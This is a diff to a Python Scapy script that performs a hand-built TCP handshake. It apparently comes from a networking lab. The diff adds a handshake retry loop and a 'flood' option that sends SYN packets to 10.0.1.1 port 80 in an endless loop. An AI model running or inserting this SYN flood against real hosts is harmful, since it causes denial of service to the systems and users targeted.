@@ -32,6 +32,8 @@ class TCPHandshake():
         self.srcPort = 1234
         self.seqNum = 100
         self.ackNum = 0
+        # flag 
+        self.established = False
 
     def start(self):
         print "sending on interface %s to %s" % (self.iface, str(self.addr))
@@ -70,6 +72,7 @@ class TCPHandshake():
         sendp(ack)
         # received packet from target
         sniff(iface=self.iface,prn = lambda x: self.handle_recv(x),count=1,timeout=1)
+        self.established = True
 
     def send_data(self,mes):
         l2 = Ether(src=get_if_hwaddr(self.iface), dst='ff:ff:ff:ff:ff:ff')
@@ -79,16 +82,33 @@ class TCPHandshake():
         pkt.show2()
         sendp(pkt)
 
+def synFlood():
+    l2 = Ether(src=get_if_hwaddr(get_if()), dst='ff:ff:ff:ff:ff:ff')
+    syn = l2 / IP(dst="10.0.1.1") / TCP(dport=80, sport=random.randint(49152,65535),flags='S',seq=300)
+    # send syn packet
+    print "send synFlood"
+    sendp(syn, iface=get_if(), verbose=False,loop=1)
 
 def main():
-    tcp_handshake = TCPHandshake()
-    print "start hand shaking"
-    tcp_handshake.start()
-    print "handshake finished"
-    print "=============================="
-    print "send data"
-    for i in range(1,4):
-        tcp_handshake.send_data(str(i))
+    if len(sys.argv) == 2: 
+        if sys.argv[1] == "flood":
+            synFlood()
+    else:
+        tcp_handshake = TCPHandshake()
+        print "start hand shaking"
+        tcp_handshake.start()
+        while(1):
+            if(tcp_handshake.established):
+                break
+            else:
+                print "restart hand shaking"
+                tcp_handshake.start()
+    
+        print "handshake finished"
+        print "=============================="
+        print "send data"
+        for i in range(1,4):
+            tcp_handshake.send_data(str(i))
     
     
 
